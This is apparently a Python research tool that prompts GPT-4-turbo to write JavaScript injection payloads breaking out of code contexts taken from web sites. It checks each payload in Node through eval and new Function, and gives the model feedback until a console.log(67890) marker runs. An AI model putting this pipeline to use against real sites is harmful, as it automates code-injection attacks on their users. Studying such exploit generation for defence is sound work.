import pexpect, re
from openai import OpenAI
from pprint import pprint 
from llm_config import CONFIG
from tqdm import tqdm

class LLMExploitGenerator:
    def __init__(self):
        self.client = OpenAI(
            api_key=CONFIG["API_KEY"]
        )
        # child = pexpect.spawn('node', timeout=5)
        # child.expect('>')
        
        
    def communicate_with_child(self, command, mode='eval'):
        child = pexpect.spawn('/usr/local/bin/node', timeout=5, env={'NODE_REPL_PROMPT': '> '})
        #prompt_pattern = '> ' #rb'\x1b\[.*>.*'  # This accounts for escape sequences around the prompt.
        prompt_pattern = rb'(?:\x1b\[\d*;?\d*[A-HJKSTfimnsu])*> \x1b\[3G'
        child.expect(prompt_pattern)
        child.sendline(command + '\n')
        child.expect(prompt_pattern)
        output = child.before.decode()  # Decode byte output to string
        output_list = [each for each in output.strip().split('\n') if each != '']
        if mode == 'new_function':
            # Very strange behavior, have to repeat 3 more times
            for _ in range(3):
                child.sendline(command + '\n')
                child.expect(prompt_pattern) 
                output_list += [each for each in child.before.decode().strip().split('\n') if each != '']
            # print(output_list)
            for idx, out in enumerate(output_list):
                check_str = '[new Function('
                next = output_list[idx+1] if len(output_list) > idx+1 else output_list[0]
                if check_str in out and check_str not in next:
                    break
            else:
                raise ValueError(f'strange behavior of node new Function on cmd {command}')
            self.exit_node(child)
            return next
        else: 
            # eval
            if 'eval' not in output_list[0]:
                raise ValueError(f'strange behavior of node eval on cmd {command}')
            self.exit_node(child)
            return output_list[0] if len(output_list) == 1 else output_list[1]
    
    
    def exit_node(self, child):
        child.sendline('process.exit();')
        child.expect(pexpect.EOF)
        child.close()
        
    
    def ask_single_question(self, question, initial_msg, debug_print=True):
        assert question.endswith('MyString`')
        my_msg = initial_msg + [{"role": "user", "content": question}]
        if debug_print:
            print(f'my_msg is {my_msg}')
        response = self.client.chat.completions.create(
            model="gpt-4-turbo-2024-04-09",
            messages=my_msg
        )
        
        current_err, current_mode, msg_to_send = '', '', ''
        current_leading_str = {
            'eval': 'eval(', 
            'new_function': '[new Function('
        }
        current_ending_str = {
            'eval': ')', 
            'new_function': ')()]'
        }
        for i in range(CONFIG['MAX_TRIAL']):
            if debug_print:
                print(f'------------- {i} -------------')
                print(response.choices[0].message.content)
            
            # Check if nothing is missing from the answer code
            if not response.choices[0].message.content.startswith(question[:-len('MyString`')]):
                msg_to_send = CONFIG['ARE_YOU_SURE']['Missing']
            elif 'MyString' in response.choices[0].message.content:
                msg_to_send = CONFIG['ARE_YOU_SURE']['NotReplaced']
            else:
                # Not missing. Using node to test the answer code
                eval_code = f"{current_leading_str['eval']}{response.choices[0].message.content})"
                eval_stdout = self.communicate_with_child(eval_code)
                if current_mode == '':
                    if 'Illegal return statement' in eval_stdout or 'return' in question:
                        current_mode = 'new_function'
                    else:
                        current_mode = 'eval'
                current_stdout = eval_stdout
                if current_mode == 'new_function':
                    # Change stdout to func_stdout
                    new_function_code = f"{current_leading_str['new_function']}{response.choices[0].message.content})()]"
                    current_stdout = self.communicate_with_child(new_function_code, mode=current_mode)
                
                if re.findall(CONFIG['true_positive_pattern'], current_stdout):
                    # The code is working! (Even if there could be some err)
                    return response.choices[0].message.content
                else:
                    # Not outputting 67890
                    msg_to_send = CONFIG['ARE_YOU_SURE']['NoExecution']
                    
                    # Check if any error. If so, using CONFIG['SyntaxError']
                    if 'SyntaxError' in current_stdout:
                        msg_to_send = f"When called upon {current_mode}, {CONFIG['ARE_YOU_SURE']['SyntaxError']}"
                    else: 
                        temp_stdout = current_stdout
                        for i in range(CONFIG['MAX_TRIAL']):
                            if re.findall(CONFIG['true_positive_pattern'], temp_stdout):
                                # The code is working! (Even if there could be some err)
                                return response.choices[0].message.content
                            ReferenceError_match = re.search(CONFIG['ReferenceError_pattern'], temp_stdout)
                            TypeError_match = re.search(CONFIG['ReferenceError_pattern'], temp_stdout)
                            if ReferenceError_match: 
                                variable_name = ReferenceError_match.group(1)
                                # Define the not defined variable to an anonymous function
                                current_leading_str[current_mode] += f"`{variable_name}" + '=function(){};`+'
                                new_code = current_leading_str[current_mode] + response.choices[0].message.content + current_ending_str[current_mode]
                                temp_stdout = self.communicate_with_child(new_code, mode=current_mode)
                            elif TypeError_match: 
                                variable_name = TypeError_match.group(1)
                                # Define the not defined variable to an anonymous function
                                current_leading_str[current_mode] += f"`{variable_name}" + '=function(){};`+'
                                new_code = current_leading_str[current_mode] + response.choices[0].message.content + current_ending_str[current_mode]
                                temp_stdout = self.communicate_with_child(new_code, mode=current_mode)
                            elif 'SyntaxError' in temp_stdout:
                                msg_to_send = f"When called upon {current_mode}, {CONFIG['ARE_YOU_SURE']['SyntaxError']}"
                                break
                            elif 'Error' in temp_stdout:
                                err_msg = temp_stdout.split('\n')[0]
                                msg_to_send = f"When called upon {current_mode}, {err_msg}, {CONFIG['ARE_YOU_SURE']['GeneralError']}"
                                break
                            else:
                                # Fall back to 'Not outputting 67890' case
                                break
        
            # Ready to send
            my_msg.append({
                "role": "assistant", "content": response.choices[0].message.content
            })
            my_msg.append({"role": "user", "content": msg_to_send})
            response = self.client.chat.completions.create(
                model="gpt-4-turbo-2024-04-09",
                messages=my_msg
            )
            
        return response.choices[0].message.content


    def batch_gen_cache_only(self, codes):
        answers = {}
        for site, info_list in codes.items():
            for each_dict in info_list:
                if each_dict["code"] == "MyString":
                    each_dict["exploit"] = "console.log(67890);//"
                    continue
                question = '`' + each_dict["code"] + '`'
                
                # Using cache
                for idx, exmpl in enumerate(CONFIG['EXAMPLE']):
                    if question.find(exmpl.replace('MyString`', '')) == 0:
                        # Cache found
                        answer = CONFIG['HIS_ANS'][idx]
                        each_dict["exploit"] = answer.strip('`')\
                            .replace(question.strip('`').replace("MyString", ''), '')\
                                + ';//'
                        break
        return codes
    
    
    def batch_gen(self, codes, debug_print=False):
        my_msg = [
            {"role": "system", "content": CONFIG["SYS"]}, 
            {"role": "user", "content": CONFIG["USER"] + '\n' + CONFIG["EXAMPLE"][0]}, 
            {"role": "assistant", "content": CONFIG["HIS_ANS"][0]}
        ]
        assert len(CONFIG["EXAMPLE"]) == len(CONFIG["HIS_ANS"])
        for each in range(1, len(CONFIG["EXAMPLE"])-1):
            my_msg += [
                {"role": "user", "content": CONFIG["EXAMPLE"][each]}, 
                {"role": "assistant", "content": CONFIG["HIS_ANS"][each]}
            ]
        answers = {}
        for site, info_list in tqdm(codes.items()):
            for each_dict in info_list:
                if each_dict["code"] == "MyString":
                    each_dict["exploit"] = "console.log(67890);//"
                    continue
                question = '`' + each_dict["code"] + '`'
                
                # Using cache
                for idx, exmpl in enumerate(CONFIG['EXAMPLE']):
                    if question.find(exmpl.replace('MyString`', '')) == 0:
                        # Cache found
                        answer = CONFIG['HIS_ANS'][idx]
                        each_dict["exploit"] = answer.strip('`')\
                            .replace(question.strip('`').replace("MyString", ''), '')\
                                + ';//'
                        break
                else:
                    INPUT_LIMIT = 5000
                    # Cache not found
                    try:
                        if len(question) > INPUT_LIMIT:
                            raise ValueError("Input too long!")
                        answer = self.ask_single_question(question, my_msg, debug_print=debug_print)
                        each_dict["exploit"] = answer.strip('`')\
                            .replace(question.strip('`').replace("MyString", ''), '')\
                                + ';//'
                    except KeyboardInterrupt:
                        raise
                    except Exception as e:
                        answer = f'Error: {e}'
                        print(f'{site} ----------- question {question[:INPUT_LIMIT]} ... ----------- {answer}')
                    # finally:
                    #     answers["site"] = answer
        return codes

if __name__ == "__main__":
    eg = LLMExploitGenerator()
    #print(eg.batch_gen({'EXAMPLE':[{"code":'''document.writeln("<script type=\'MyString'''}]}, debug_print=True))
    print(eg.batch_gen({'EXAMPLE':[{"code":"with(this){return (\u00f3`\u0087e\u0016S\u00e5]\\O\u001aO\u00ae\u008b</a>  </div></div>)?_c('header',{staticClass:\"input-group\",staticStyle:{},attrs:{\"id\":\"topBarCtrl\"}},[(\u00f3`\u0087e\u0016S\u00e5]\\O\u001aO\u00ae\u008b</a>  </div></div>)?_c('app-template',{staticClass:\"input-group\",staticStyle:{},attrs:{\"user\":user,\"model\":model}}):_e(),_v(\" \"),(\u00f3`\u0087e\u0016S\u00e5]\\O\u001aO\u00ae\u008b</a>  </div></div>)?_c('div',{staticClass:\"MyString"}]}, debug_print=True))